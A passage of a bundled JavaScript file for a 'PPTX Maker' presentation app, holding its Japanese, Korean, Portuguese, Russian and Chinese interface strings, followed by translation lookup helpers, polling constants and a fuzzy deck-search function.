			"install_engine": "エンジンをインストール",
			"install_icon_packs": "アイコンパックをインストール",
			"loading": "読み込み中…",
			"mode_spec": "仕様モード",
			"mode_spec_hint": "最初にインタビューを行い、その後、スライドの前にブリーフ、アウトライン、アートディレクションを行います。",
			"mode_style": "スタイルクリエーター",
			"mode_style_hint": "後で任意のデッキに適用できる再利用可能な視覚的スタイルを構築します。",
			"mode_vibe": "Vibe モード",
			"mode_vibe_hint": "URL またはテキストを貼り付けて、すぐにスライドを取得します。",
			"no_decks_yet": "デッキはまだありません",
			"no_decks_yet_hint": "上記で 1 つを開始すると、エージェントがここに書き込みます。",
			"no_matching_decks": "その検索に一致するデッキはありません",
			"optional_deps_missing": "{{labels}} がインストールされていないため、スライドサムネイルと PDF プレビューは利用できません。",
			"optional_deps_missing_with_hint": "{{labels}} がインストールされていないため、スライドサムネイルと PDF プレビューは利用できません。以下を使用してインストールしてください: {{command}}",
			"reset": "リセット",
			"retry_install": "インストールをもう一度試す",
			"save": "保存",
			"saved": "保存しました。",
			"search_decks": "デッキを検索…",
			"select_a_deck": "デッキを選択して開きます。",
			"slide_count_other": "{{count}} 個のスライド",
			"start_a_deck": "デッキを開始",
			"start_a_deck_tip": "デッキの生成はチャットで行われます。モードを選択すると、アプリはそれを実行するエージェントのセッションを開きます。",
			"stat_decks": "デッキ",
			"stat_finished": "完成したファイル",
			"stat_slides": "スライド",
			"stat_styles": "スタイル",
			"stat_templates": "テンプレート",
			"subtitle": "チャットでデッキについて説明し、実際の .pptx になる様子を見ます",
			"title": "PPTX Maker",
			"view_decks": "デッキ",
			"view_library": "ライブラリ",
			"view_settings": "設定",
			"view_styles": "スタイル",
			"view_templates": "テンプレート"
		},
		"slidePreview": { "preview_unavailable": "プレビューは利用できません" }
	} } },
	ko: { apps: { "pptxMaker": {
		"boardFrame": {
			"loading": "미리보기를 불러오는 중…",
			"thumbnail": "스타일 썸네일"
		},
		"deckViewer": {
			"copy_folder_path": "폴더 경로 복사",
			"deck_not_found": "덱을 찾을 수 없습니다",
			"download_pptx": ".pptx 다운로드",
			"folder_path_copied": "폴더 경로를 복사했습니다",
			"loading": "불러오는 중…",
			"no_slides_yet": "아직 슬라이드 없음",
			"slides_appear_as_the_agent_composes_them": "에이전트가 슬라이드를 구성하는 대로 여기에 표시됩니다.",
			"tab_art_direction": "아트 디렉션",
			"tab_brief": "브리프",
			"tab_outline": "개요",
			"tab_slides": "슬라이드",
			"unavailable": "이 산출물을 읽을 수 없습니다."
		},
		"libraryPanel": {
			"accepts_html": ".html 스타일 문서를 받습니다",
			"accepts_pptx": ".pptx 파일을 받습니다",
			"built_in": "번들 제공",
			"cancel": "취소",
			"delete": "삭제",
			"font_specimen": "Aa",
			"fonts": "폰트: {{fonts}}",
			"import_style": "스타일 가져오기",
			"import_template": "템플릿 가져오기",
			"layouts_other": "레이아웃 {{count}}개",
			"loading": "불러오는 중…",
			"mine": "내 항목",
			"new_name": "새 이름",
			"no_styles_yet": "아직 스타일 없음",
			"no_templates_yet": "아직 템플릿 없음",
			"pin_style": "이 스타일 고정",
			"pinned": "고정됨",
			"reference_in_chat": "채팅에서 참조할 이름:",
			"rename": "이름 변경",
			"save": "저장",
			"select_a_style": "스타일을 선택하면 미리 볼 수 있습니다.",
			"select_a_template": "템플릿을 선택하면 미리 볼 수 있습니다.",
			"style_preview": "스타일 미리보기",
			"styles": "스타일",
			"styles_tip": "스타일은 시각적 분위기 — 색상·서체·레이아웃의 느낌입니다. 에이전트가 슬라이드를 구성할 때 이를 따릅니다.",
			"templates": "템플릿",
			"templates_tip": "템플릿은 슬라이드 레이아웃이 테마 색상·폰트·사용 가능한 레이아웃을 정하는 .pptx입니다.",
			"unpin_style": "이 스타일 고정 해제"
		},
		"manifest": {
			"use_case_1": "아이디어, URL 또는 원문을 실제 프레젠테이션으로 바꾸고, 슬라이드를 실시간으로 미리 보며 시각적 스타일을 재사용합니다.",
			"configuration_1": "처음 사용할 때 고정된 엔진을 설치하고, 더 폭넓은 미리 보기가 필요하면 LibreOffice를 설치하세요. 출력 디렉터리를 선택하고 재사용할 HTML 스타일 또는 PPTX 템플릿을 가져오세요.",
			"description": "원하는 덱을 채팅으로 설명하면 실제 .pptx를 받습니다. 에이전트가 인터뷰하고 브리프, 개요, 아트 디렉션을 작성한 뒤 모든 슬라이드를 구성하고 파일을 생성하며, 대화 옆의 실시간 미리보기에서 각 산출물이 나타나는 것을 볼 수 있습니다. 슬라이드는 만들어지는 동안 애니메이션 SVG로 렌더링되므로 다운로드를 기다리는 대신 덱이 모습을 갖추는 과정을 볼 수 있습니다. 재사용 가능한 스타일과 .pptx 템플릿으로 같은 콘텐츠를 세 가지 다른 프레젠테이션처럼 보이게 할 수 있습니다.",
			"display_name": "PPTX Maker",
			"highlight_1": "채팅으로 완성된 .pptx까지 — 스펙 모드는 꼼꼼히 계획하고, Vibe 모드는 URL이나 붙여넣은 텍스트를 바로 슬라이드로 만듭니다",
			"highlight_2": "모든 산출물의 실시간 미리보기: 브리프, 개요, 아트 디렉션, 그다음 구성되는 동안 애니메이션 SVG로 보이는 슬라이드",
			"highlight_3": "스타일이 시각적 분위기를, .pptx 템플릿이 구조를 정하므로 콘텐츠를 다시 쓰지 않고 덱 하나의 외형만 바꿀 수 있습니다",
			"highlight_4": "직접 만든 HTML 스타일이나 기존 .pptx 템플릿을 가져오면 에이전트가 그 색상·폰트·레이아웃을 따릅니다",
			"highlight_5": "대시보드를 떠나지 않고 완성된 파일을 열거나 해당 폴더를 표시합니다",
			"highlight_6": "공개 spec-driven-presentation-maker 엔진을 감싸며 sha256으로 고정된 버전을 가져옵니다. 직접 설치할 것은 없습니다",
			"page_label": "PPTX Maker"
		},
		"pptxMakerPage": {
			"deck_output_directory": "덱 출력 디렉터리",
			"deck_output_directory_tip": "완성된 덱이 기록되는 위치입니다. 에이전트는 이 폴더 아래의 덱을 읽고 씁니다.",
			"decks": "덱",
			"decks_tip": "엔진이 출력 디렉터리 아래에 만든 모든 덱입니다. 하나를 선택하면 산출물을 볼 수 있습니다.",
			"engine_install_failed": "프레젠테이션 엔진을 설치할 수 없습니다.",
			"engine_installing": "프레젠테이션 엔진 설치 중… {{seconds}}초",
			"engine_not_installed": "프레젠테이션 엔진이 아직 설치되지 않았습니다.",
			"engine_requirements": "엔진의 검증된 사본을 다운로드합니다 — 설치할 것은 없습니다. {{tag}}에 고정되어 있습니다.",
			"icon_packs_failed": "아이콘 팩을 설치하지 못했습니다.",
			"icon_packs_hint": "에이전트가 슬라이드를 구성하려면 필요합니다. 엔진의 무료 아이콘 세트 두 개(약 40MB)를 내려받습니다.",
			"icon_packs_installing": "아이콘 팩을 설치하는 중… {{seconds}}초",
			"icon_packs_missing": "아이콘 팩이 아직 설치되지 않았습니다.",
			"install_engine": "엔진 설치",
			"install_icon_packs": "아이콘 팩 설치",
			"loading": "불러오는 중…",
			"mode_spec": "스펙 모드",
			"mode_spec_hint": "먼저 인터뷰를 하고, 슬라이드 전에 브리프, 개요, 아트 디렉션을 만듭니다.",
			"mode_style": "스타일 크리에이터",
			"mode_style_hint": "나중에 어떤 덱에도 적용할 수 있는 재사용 가능한 시각 스타일을 만듭니다.",
			"mode_vibe": "Vibe 모드",
			"mode_vibe_hint": "URL이나 텍스트를 붙여넣으면 바로 슬라이드를 받습니다.",
			"no_decks_yet": "아직 덱 없음",
			"no_decks_yet_hint": "위에서 하나를 시작하면 에이전트가 여기에 작성합니다.",
			"no_matching_decks": "검색과 일치하는 덱이 없습니다",
			"optional_deps_missing": "{{labels}}이(가) 설치되지 않아 슬라이드 썸네일과 PDF 미리보기를 사용할 수 없습니다.",
			"optional_deps_missing_with_hint": "{{labels}}이(가) 설치되지 않아 슬라이드 썸네일과 PDF 미리보기를 사용할 수 없습니다. 다음으로 설치하세요: {{command}}",
			"reset": "초기화",
			"retry_install": "설치 다시 시도",
			"save": "저장",
			"saved": "저장되었습니다.",
			"search_decks": "덱 검색…",
			"select_a_deck": "덱을 선택하면 열립니다.",
			"slide_count_other": "슬라이드 {{count}}개",
			"start_a_deck": "덱 시작",
			"start_a_deck_tip": "덱 생성은 채팅에서 이루어집니다. 모드를 선택하면 앱이 이를 실행하는 에이전트의 세션을 엽니다.",
			"stat_decks": "덱",
			"stat_finished": "완성된 파일",
			"stat_slides": "슬라이드",
			"stat_styles": "스타일",
			"stat_templates": "템플릿",
			"subtitle": "채팅으로 덱을 설명하고 실제 .pptx가 되는 과정을 확인하세요",
			"title": "PPTX Maker",
			"view_decks": "덱",
			"view_library": "라이브러리",
			"view_settings": "설정",
			"view_styles": "스타일",
			"view_templates": "템플릿"
		},
		"slidePreview": { "preview_unavailable": "미리보기를 사용할 수 없음" }
	} } },
	pt: { apps: { "pptxMaker": {
		"boardFrame": {
			"loading": "A carregar a pré-visualização…",
			"thumbnail": "Miniatura do estilo"
		},
		"deckViewer": {
			"copy_folder_path": "Copiar o caminho da pasta",
			"deck_not_found": "Apresentação não encontrada",
			"download_pptx": "Baixar o .pptx",
			"folder_path_copied": "Caminho da pasta copiado",
			"loading": "A carregar…",
			"no_slides_yet": "Ainda sem diapositivos",
			"slides_appear_as_the_agent_composes_them": "Os diapositivos aparecem aqui à medida que o agente os compõe.",
			"tab_art_direction": "Direção de arte",
			"tab_brief": "Briefing",
			"tab_outline": "Estrutura",
			"tab_slides": "Diapositivos",
			"unavailable": "Não foi possível ler este resultado."
		},
		"libraryPanel": {
			"accepts_html": "Aceita um documento de estilo .html",
			"accepts_pptx": "Aceita um arquivo .pptx",
			"built_in": "Incluídos",
			"cancel": "Cancelar",
			"delete": "Eliminar",
			"font_specimen": "Aa",
			"fonts": "Tipos de letra: {{fonts}}",
			"import_style": "Importar um estilo",
			"import_template": "Importar um modelo",
			"layouts_many": "{{count}} disposições",
			"layouts_one": "{{count}} disposição",
			"layouts_other": "{{count}} disposições",
			"loading": "A carregar…",
			"mine": "Os seus",
			"new_name": "Nome novo",
			"no_styles_yet": "Ainda sem estilos",
			"no_templates_yet": "Ainda sem modelos",
			"pin_style": "Fixar este estilo",
			"pinned": "Fixado",
			"reference_in_chat": "Refira-o na conversa assim:",
			"rename": "Mudar o nome",
			"save": "Guardar",
			"select_a_style": "Escolha um estilo para o pré-visualizar.",
			"select_a_template": "Escolha um modelo para o pré-visualizar.",
			"style_preview": "Pré-visualização do estilo",
			"styles": "Estilos",
			"styles_tip": "Um estilo é o ambiente visual — cores, tipografia e sensação de composição. O agente segue-o ao compor os diapositivos.",
			"templates": "Modelos",
			"templates_tip": "Um modelo é um modelo global de diapositivos .pptx. Define as cores do tema, os tipos de letra e as disposições disponíveis.",
			"unpin_style": "Deixar de fixar este estilo"
		},
		"manifest": {
			"description": "Descreva no chat a apresentação que você quer e receba um .pptx de verdade. Um agente entrevista você, escreve um briefing, uma estrutura e uma direção de arte, depois compõe cada slide e gera o arquivo — e você vê cada entrega aparecer em uma pré-visualização ao vivo ao lado da conversa. Os slides são renderizados como SVG animado enquanto são construídos, para você ver a apresentação tomar forma em vez de esperar por um download. Estilos reutilizáveis e modelos .pptx permitem que o mesmo conteúdo saia com a aparência de três apresentações diferentes.",
			"display_name": "PPTX Maker",
			"highlight_1": "Chegue a um .pptx pronto conversando — o Modo especificação planeja com cuidado, o Modo direto transforma uma URL ou um texto colado direto em slides",
			"highlight_2": "Pré-visualização ao vivo de cada entrega: briefing, estrutura, direção de arte e depois os slides como SVG animado enquanto são compostos",
			"highlight_3": "Os estilos definem o clima visual e os modelos .pptx definem a estrutura, então uma apresentação pode trocar de cara sem reescrever o conteúdo",
			"highlight_4": "Importe o seu próprio estilo em HTML ou um modelo .pptx existente e o agente segue as cores, as fontes e os layouts dele",
			"highlight_5": "Abra o arquivo final ou mostre a pasta dele sem sair do painel",
			"highlight_6": "Encapsula o motor público spec-driven-presentation-maker, obtido em uma versão fixada por sha256; nada para instalar à mão",
			"page_label": "PPTX Maker",
			"use_case_1": "Transforme uma ideia, URL ou texto de origem em uma apresentação real com prévias de slides ao vivo e estilos visuais reutilizáveis.",
			"configuration_1": "Instale o motor com versão fixada no primeiro uso e, se quiser, o LibreOffice para mais prévias; escolha um diretório de saída e importe os estilos HTML ou modelos PPTX que deseja reutilizar."
		},
		"pptxMakerPage": {
			"deck_output_directory": "Pasta de saída das apresentações",
			"deck_output_directory_tip": "Onde são escritas as apresentações concluídas. O agente lê e escreve apresentações dentro desta pasta.",
			"decks": "Apresentações",
			"decks_tip": "Todas as apresentações que o motor produziu na pasta de saída. Escolha uma para acompanhar os seus resultados.",
			"engine_install_failed": "Não foi possível instalar o motor de apresentações.",
			"engine_installing": "A instalar o motor de apresentações… {{seconds}} s",
			"engine_not_installed": "O motor de apresentações ainda não está instalado.",
			"engine_requirements": "Baixa uma cópia verificada do motor — nada a instalar. Fixado em {{tag}}.",
			"icon_packs_failed": "Não foi possível instalar os pacotes de ícones.",
			"icon_packs_hint": "O agente precisa deles para compor os slides. Baixa os dois conjuntos de ícones gratuitos do mecanismo (cerca de 40 MB).",
			"icon_packs_installing": "Instalando os pacotes de ícones… {{seconds}} s",
			"icon_packs_missing": "Os pacotes de ícones ainda não estão instalados.",
			"install_engine": "Instalar o motor",
			"install_icon_packs": "Instalar pacotes de ícones",
			"loading": "A carregar…",
			"mode_spec": "Modo especificação",
			"mode_spec_hint": "Primeiro uma entrevista, depois um briefing, uma estrutura e uma direção de arte antes de qualquer diapositivo.",
			"mode_style": "Criador de estilos",
			"mode_style_hint": "Crie um estilo reutilizável que possa aplicar a qualquer apresentação posterior.",
			"mode_vibe": "Modo direto",
			"mode_vibe_hint": "Cole um URL ou algum texto e obtenha diapositivos de imediato.",
			"no_decks_yet": "Ainda sem apresentações",
			"no_decks_yet_hint": "Comece uma acima e o agente escreve-a aqui.",
			"no_matching_decks": "Nenhuma apresentação corresponde a essa pesquisa",
			"optional_deps_missing": "{{labels}} não está instalado, por isso as miniaturas dos diapositivos e a pré-visualização em PDF não estão disponíveis.",
			"optional_deps_missing_with_hint": "{{labels}} não está instalado, por isso as miniaturas dos diapositivos e a pré-visualização em PDF não estão disponíveis. Instale-o com: {{command}}",
			"reset": "Reverter",
			"retry_install": "Tentar instalar de novo",
			"save": "Guardar",
			"saved": "Guardado.",
			"search_decks": "Pesquisar apresentações…",
			"select_a_deck": "Escolha uma apresentação para a abrir.",
			"slide_count_many": "{{count}} diapositivos",
			"slide_count_one": "{{count}} diapositivo",
			"slide_count_other": "{{count}} diapositivos",
			"start_a_deck": "Começar uma apresentação",
			"start_a_deck_tip": "As apresentações nascem na conversa. Escolha um modo e a app abre uma sessão com o agente que o executa.",
			"stat_decks": "Apresentações",
			"stat_finished": "Arquivos concluídos",
			"stat_slides": "Diapositivos",
			"stat_styles": "Estilos",
			"stat_templates": "Modelos",
			"subtitle": "Descreva uma apresentação na conversa e veja-a tornar-se um .pptx real",
			"title": "PPTX Maker",
			"view_decks": "Apresentações",
			"view_library": "Biblioteca",
			"view_settings": "Definições",
			"view_styles": "Estilos",
			"view_templates": "Modelos"
		},
		"slidePreview": { "preview_unavailable": "Pré-visualização não disponível" }
	} } },
	ru: { apps: { "pptxMaker": {
		"boardFrame": {
			"loading": "Загрузка предпросмотра…",
			"thumbnail": "Миниатюра стиля"
		},
		"deckViewer": {
			"copy_folder_path": "Скопировать путь к папке",
			"deck_not_found": "Презентация не найдена",
			"download_pptx": "Скачать .pptx",
			"folder_path_copied": "Путь к папке скопирован",
			"loading": "Загрузка…",
			"no_slides_yet": "Слайдов пока нет",
			"slides_appear_as_the_agent_composes_them": "Слайды появляются здесь по мере того, как агент их собирает.",
			"tab_art_direction": "Арт-дирекция",
			"tab_brief": "Брифинг",
			"tab_outline": "Структура",
			"tab_slides": "Слайды",
			"unavailable": "Не удалось прочитать этот результат."
		},
		"libraryPanel": {
			"accepts_html": "Принимает документ стиля .html",
			"accepts_pptx": "Принимает файл .pptx",
			"built_in": "Встроенные",
			"cancel": "Отмена",
			"delete": "Удалить",
			"font_specimen": "Aa",
			"fonts": "Шрифты: {{fonts}}",
			"import_style": "Импортировать стиль",
			"import_template": "Импортировать шаблон",
			"layouts_few": "{{count}} макета",
			"layouts_many": "{{count}} макетов",
			"layouts_one": "{{count}} макет",
			"layouts_other": "{{count}} макета",
			"loading": "Загрузка…",
			"mine": "Ваши",
			"new_name": "Новое название",
			"no_styles_yet": "Стилей пока нет",
			"no_templates_yet": "Шаблонов пока нет",
			"pin_style": "Закрепить этот стиль",
			"pinned": "Закреплён",
			"reference_in_chat": "Ссылайтесь на него в переписке так:",
			"rename": "Переименовать",
			"save": "Сохранить",
			"select_a_style": "Выберите стиль, чтобы посмотреть его.",
			"select_a_template": "Выберите шаблон, чтобы посмотреть его.",
			"style_preview": "Предпросмотр стиля",
			"styles": "Стили",
			"styles_tip": "Стиль задаёт визуальное настроение — цвета, типографику и ощущение вёрстки. Агент следует ему, собирая слайды.",
			"templates": "Шаблоны",
			"templates_tip": "Шаблон — это образец слайдов .pptx. Он задаёт цвета темы, шрифты и доступные макеты.",
			"unpin_style": "Открепить этот стиль"
		},
		"manifest": {
			"description": "Опиши нужную презентацию в чате и получи настоящий .pptx. Агент задаёт вопросы, пишет брифинг, структуру и арт-дирекцию, затем собирает каждый слайд и создаёт файл — а ты видишь, как каждый результат появляется в живом предпросмотре рядом с разговором. Слайды отрисовываются как анимированный SVG по мере сборки, поэтому презентация складывается у тебя на глазах, а не приходит скачанным файлом. Переиспользуемые стили и шаблоны .pptx позволяют одному и тому же содержимому выглядеть как три разные презентации.",
			"display_name": "PPTX Maker",
			"use_case_1": "Превращайте идею, URL или исходный текст в настоящую презентацию с живым предпросмотром слайдов и повторно используемыми визуальными стилями.",
			"configuration_1": "При первом запуске установите закреплённую версию движка, при желании добавьте LibreOffice для расширенного предпросмотра, выберите каталог вывода и импортируйте нужные HTML-стили или шаблоны PPTX.",
			"highlight_1": "Готовый .pptx собирается прямо в чате — режим спецификации всё аккуратно планирует, быстрый режим превращает URL или вставленный текст сразу в слайды",
			"highlight_2": "Живой предпросмотр каждого результата: брифинг, структура, арт-дирекция, а затем слайды как анимированный SVG по мере сборки",
			"highlight_3": "Стили задают внешний настрой, а шаблоны .pptx — структуру, поэтому одну презентацию можно переодеть, не переписывая содержимое",
			"highlight_4": "Импортируй свой стиль в HTML или готовый шаблон .pptx — агент будет следовать его цветам, шрифтам и разметке",
			"highlight_5": "Открой готовый файл или покажи его папку, не покидая панель",
			"highlight_6": "Использует публичный движок spec-driven-presentation-maker, загружаемый в версии, закреплённой по sha256; ставить руками ничего не нужно",
			"page_label": "PPTX Maker"
		},
		"pptxMakerPage": {
			"deck_output_directory": "Папка для готовых презентаций",
			"deck_output_directory_tip": "Куда записываются готовые презентации. Агент читает и записывает презентации внутри этой папки.",
			"decks": "Презентации",
			"decks_tip": "Все презентации, созданные движком в папке вывода. Выберите одну, чтобы следить за её результатами.",
			"engine_install_failed": "Не удалось установить движок презентаций.",
			"engine_installing": "Установка движка презентаций… {{seconds}} с",
			"engine_not_installed": "Движок презентаций ещё не установлен.",
			"engine_requirements": "Загружает проверенную копию движка — ничего устанавливать не нужно. Зафиксировано на {{tag}}.",
			"icon_packs_failed": "Не удалось установить наборы значков.",
			"icon_packs_hint": "Они нужны агенту, чтобы собирать слайды. Скачиваются два бесплатных набора значков движка (около 40 МБ).",
			"icon_packs_installing": "Устанавливаются наборы значков… {{seconds}} с",
			"icon_packs_missing": "Наборы значков ещё не установлены.",
			"install_engine": "Установить движок",
			"install_icon_packs": "Установить наборы значков",
			"loading": "Загрузка…",
			"mode_spec": "Режим спецификации",
			"mode_spec_hint": "Сначала интервью, затем брифинг, структура и арт-дирекция — и только потом слайды.",
			"mode_style": "Мастерская стилей",
			"mode_style_hint": "Соберите многоразовый стиль, который можно применить к любой следующей презентации.",
			"mode_vibe": "Быстрый режим",
			"mode_vibe_hint": "Вставьте ссылку или немного текста и сразу получите слайды.",
			"no_decks_yet": "Презентаций пока нет",
			"no_decks_yet_hint": "Начните одну выше, и агент запишет её здесь.",
			"no_matching_decks": "Ни одна презентация не подходит под этот запрос",
			"optional_deps_missing": "{{labels}} не установлен, поэтому миниатюры слайдов и предпросмотр PDF недоступны.",
			"optional_deps_missing_with_hint": "{{labels}} не установлен, поэтому миниатюры слайдов и предпросмотр PDF недоступны. Установите его командой: {{command}}",
			"reset": "Сбросить",
			"retry_install": "Повторить установку",
			"save": "Сохранить",
			"saved": "Сохранено.",
			"search_decks": "Поиск презентаций…",
			"select_a_deck": "Выберите презентацию, чтобы открыть её.",
			"slide_count_few": "{{count}} слайда",
			"slide_count_many": "{{count}} слайдов",
			"slide_count_one": "{{count}} слайд",
			"slide_count_other": "{{count}} слайда",
			"start_a_deck": "Начать презентацию",
			"start_a_deck_tip": "Презентации создаются в переписке. Выберите режим — и приложение откроет сеанс с нужным агентом.",
			"stat_decks": "Презентации",
			"stat_finished": "Готовые файлы",
			"stat_slides": "Слайды",
			"stat_styles": "Стили",
			"stat_templates": "Шаблоны",
			"subtitle": "Опишите презентацию в переписке и смотрите, как из неё получается настоящий .pptx",
			"title": "PPTX Maker",
			"view_decks": "Презентации",
			"view_library": "Библиотека",
			"view_settings": "Настройки",
			"view_styles": "Стили",
			"view_templates": "Шаблоны"
		},
		"slidePreview": { "preview_unavailable": "Предпросмотр недоступен" }
	} } },
	"zh-CN": { apps: { "pptxMaker": {
		"boardFrame": {
			"loading": "正在加载预览……",
			"thumbnail": "风格缩略图"
		},
		"deckViewer": {
			"copy_folder_path": "复制文件夹路径",
			"deck_not_found": "未找到该演示文稿",
			"download_pptx": "下载 .pptx",
			"folder_path_copied": "已复制文件夹路径",
			"loading": "正在加载……",
			"no_slides_yet": "还没有幻灯片",
			"slides_appear_as_the_agent_composes_them": "代理排版幻灯片时，它们会陆续出现在这里。",
			"tab_art_direction": "美术方向",
			"tab_brief": "需求简报",
			"tab_outline": "大纲",
			"tab_slides": "幻灯片",
			"unavailable": "无法读取此产出。"
		},
		"libraryPanel": {
			"accepts_html": "接受 .html 风格文档",
			"accepts_pptx": "接受 .pptx 文件",
			"built_in": "内置",
			"cancel": "取消",
			"delete": "删除",
			"font_specimen": "Aa",
			"fonts": "字体：{{fonts}}",
			"import_style": "导入风格",
			"import_template": "导入模板",
			"layouts_other": "{{count}} 种版式",
			"loading": "正在加载……",
			"mine": "自有",
			"new_name": "新名称",
			"no_styles_yet": "还没有风格",
			"no_templates_yet": "还没有模板",
			"pin_style": "置顶此风格",
			"pinned": "已置顶",
			"reference_in_chat": "在对话中这样引用它：",
			"rename": "重命名",
			"save": "保存",
			"select_a_style": "选择一个风格以预览。",
			"select_a_template": "选择一个模板以预览。",
			"style_preview": "风格预览",
			"styles": "风格",
			"styles_tip": "风格决定视觉气质——配色、字体和版面感受。代理排版幻灯片时会遵循它。",
			"templates": "模板",
			"templates_tip": "模板是 .pptx 幻灯片母版。它决定主题配色、字体以及可用的版式。",
			"unpin_style": "取消置顶此风格"
		},
		"manifest": {
			"use_case_1": "将想法、URL 或源文本转换为真正的演示文稿，并实时预览幻灯片和复用视觉样式。",
			"configuration_1": "首次使用时安装固定版本的引擎，可选安装 LibreOffice 以支持更多预览格式，选择输出目录，并导入要复用的 HTML 样式或 PPTX 模板。",
			"description": "在聊天里描述你想要的演示文稿，拿回一个真正的 .pptx。代理会先访谈你，写出简报、大纲和美术方向，然后排版每一张幻灯片并生成文件 — 每份产出都会在对话旁边的实时预览里出现。幻灯片在构建过程中以动画 SVG 呈现，于是你能看着演示文稿成形，而不是干等下载。可复用的样式和 .pptx 模板，让同一份内容能做出三种不同的样子。",
			"display_name": "PPTX Maker",
			"highlight_1": "聊着聊着就得到一个完成的 .pptx — 规格模式会仔细规划，速成模式把 URL 或粘贴的文字直接变成幻灯片",
			"highlight_2": "每份产出都有实时预览：简报、大纲、美术方向，然后是排版过程中以动画 SVG 呈现的幻灯片",
			"highlight_3": "样式决定视觉调性，.pptx 模板决定结构，于是同一份演示文稿可以换皮而不用重写内容",
			"highlight_4": "导入自己的 HTML 样式或现有 .pptx 模板，代理会遵循其中的配色、字体和版式",
			"highlight_5": "不离开仪表板就能打开成品文件或定位到它所在的文件夹",
			"highlight_6": "封装公开的 spec-driven-presentation-maker 引擎，按 sha256 锁定的版本拉取；无需手动安装任何东西",
			"page_label": "PPTX Maker"
		},
		"pptxMakerPage": {
			"deck_output_directory": "演示文稿输出目录",
			"deck_output_directory_tip": "完成的演示文稿写入的位置。代理在此文件夹内读写演示文稿。",
			"decks": "演示文稿",
			"decks_tip": "引擎在输出目录中生成的所有演示文稿。选择一个即可跟踪它的产出。",
			"engine_install_failed": "无法安装演示引擎。",
			"engine_installing": "正在安装演示引擎……{{seconds}} 秒",
			"engine_not_installed": "演示引擎尚未安装。",
			"engine_requirements": "自动下载并校验引擎副本，无需手动安装。版本锁定为 {{tag}}。",
			"icon_packs_failed": "图标包安装失败。",
			"icon_packs_hint": "代理需要它们来排版幻灯片。将下载引擎的两套免费图标（约 40 MB）。",
			"icon_packs_installing": "正在安装图标包… {{seconds}} 秒",
			"icon_packs_missing": "图标包尚未安装。",
			"install_engine": "安装引擎",
			"install_icon_packs": "安装图标包",
			"loading": "正在加载……",
			"mode_spec": "规格模式",
			"mode_spec_hint": "先访谈，再依次产出简报、大纲和美术方向，然后才开始做幻灯片。",
			"mode_style": "风格工坊",
			"mode_style_hint": "打造一个可复用的风格，之后任何演示文稿都能套用。",
			"mode_vibe": "速成模式",
			"mode_vibe_hint": "粘贴一个链接或一段文字，立刻得到幻灯片。",
			"no_decks_yet": "还没有演示文稿",
			"no_decks_yet_hint": "在上方开始一个，代理会把它写到这里。",
			"no_matching_decks": "没有演示文稿符合该搜索",
			"optional_deps_missing": "{{labels}} 未安装，因此幻灯片缩略图和 PDF 预览不可用。",
			"optional_deps_missing_with_hint": "{{labels}} 未安装，因此幻灯片缩略图和 PDF 预览不可用。请使用以下命令安装：{{command}}",
			"reset": "重置",
			"retry_install": "重试安装",
			"save": "保存",
			"saved": "已保存。",
			"search_decks": "搜索演示文稿……",
			"select_a_deck": "选择一个演示文稿以打开。",
			"slide_count_other": "{{count}} 张幻灯片",
			"start_a_deck": "开始一个演示文稿",
			"start_a_deck_tip": "演示文稿在对话中生成。选择一个模式，应用会用对应的代理打开一个会话。",
			"stat_decks": "演示文稿",
			"stat_finished": "已完成文件",
			"stat_slides": "幻灯片",
			"stat_styles": "风格",
			"stat_templates": "模板",
			"subtitle": "在对话中描述一份演示文稿，看它变成真正的 .pptx",
			"title": "PPTX Maker",
			"view_decks": "演示文稿",
			"view_library": "素材库",
			"view_settings": "设置",
			"view_styles": "风格",
			"view_templates": "模板"
		},
		"slidePreview": { "preview_unavailable": "预览不可用" }
	} } }
};
var own = (obj, key) => Object.prototype.hasOwnProperty.call(obj, key);
function lookup(catalog, key) {
	let node = catalog;
	for (const part of key.split(".")) {
		if (node === void 0 || typeof node === "string" || !own(node, part)) return void 0;
		node = node[part];
	}
	return typeof node === "string" ? node : void 0;
}
/** The catalogs to try for `locale`, most specific first, always ending in English. */
function localeChain(locale) {
	const chain = [];
	const add = (candidate) => {
		if (own(CATALOGS, candidate) && !chain.includes(candidate)) chain.push(candidate);
	};
	add(locale);
	add(locale.split("-")[0]);
	add("en");
	return chain;
}
function currentLocale() {
	try {
		const locale = activeLocale();
		return typeof locale === "string" && locale ? locale : "en";
	} catch {
		return "en";
	}
}
var PLACEHOLDER = /\{\{\s*(\w+)\s*\}\}/g;
function pluralForm(locale, count) {
	try {
		return new Intl.PluralRules(locale).select(count);
	} catch {
		return count === 1 ? "one" : "other";
	}
}
function t(key, vars) {
	const count = vars && typeof vars.count === "number" ? vars.count : void 0;
	for (const locale of localeChain(currentLocale())) {
		const catalog = CATALOGS[locale];
		let text;
		if (count !== void 0) text = lookup(catalog, `${key}_${pluralForm(locale, count)}`) ?? lookup(catalog, `${key}_other`);
		text = text ?? lookup(catalog, key);
		if (text !== void 0) return text.replace(PLACEHOLDER, (whole, name) => vars && own(vars, name) ? String(vars[name]) : whole);
	}
	return key;
}
/** The dashboard's name for this helper, so the ported call sites read unchanged. */
var i18nT = t;
// src/lib.ts
/** Poll intervals (ms). Chosen so a deck being built feels live without hammering
*  the gateway: the selected deck's slides recompose every few seconds, the deck
*  list changes far less often, and provisioning is a minutes-long job. */
var POLL_DECK_MS = 1500;
var POLL_DECKS_MS = 5e3;
var POLL_DOC_MS = 5e3;
var POLL_PROVISION_MS = 2500;
var POLL_IDLE_MS = 15e3;
/** Slide preview aspect ratio (16:9), as a padding-bottom percentage. */
var SLIDE_ASPECT = "56.25%";
/** The style/art-direction board's intrinsic slide size, used to scale it to fit. */
var BOARD_WIDTH = 1920;
var BOARD_HEIGHT = 1080;
var DECK_TABS = [
	"brief",
	"outline",
	"artDirection",
	"slides"
];
/**
* Subsequence match — every query character appears in order.
*
* Deck ids are timestamped (`20260101-quarterly-review`), so a strict substring
* filter makes "qr" match nothing. A subsequence match is what lets the user type
* a few letters of the name they remember.
*/
function fuzzyMatch(text, query) {
	if (!query) return true;
	const haystack = text.toLowerCase();
	const needle = query.toLowerCase();
	let i = 0;
	for (const ch of haystack) {
		if (ch === needle[i]) i += 1;
		if (i === needle.length) return true;
	}
	return i === needle.length;
}
/** Filter decks by name or brief content. */
function filterDecks(decks, query) {
	const trimmed = query.trim();
	if (!trimmed) return decks;
	const lower = trimmed.toLowerCase();
	return decks.filter((deck) => fuzzyMatch(deck.name, trimmed) || `${deck.name} ${deck.brief}`.toLowerCase().includes(lower));
}
/**
* The tab to switch to given two successive `updatedAt` maps, or null.
*
* This is what makes the viewer follow the agent: as each deliverable is written
* the newest changed key wins, so the user watches the brief appear, then the
